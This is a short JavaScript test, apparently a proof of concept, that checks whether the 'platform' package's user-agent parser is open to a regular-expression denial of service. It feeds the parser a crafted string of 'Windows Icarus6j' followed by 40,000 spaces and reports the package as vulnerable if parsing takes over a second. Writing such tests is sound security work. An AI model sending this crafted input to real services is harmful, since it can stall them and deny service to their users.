// test("ReDos in platform", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const platform = require("platform");
  let t = measureTime(function () {
    var agent = platform.parse("Windows Icarus6j" + genstr(40000, " ") + " ");
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
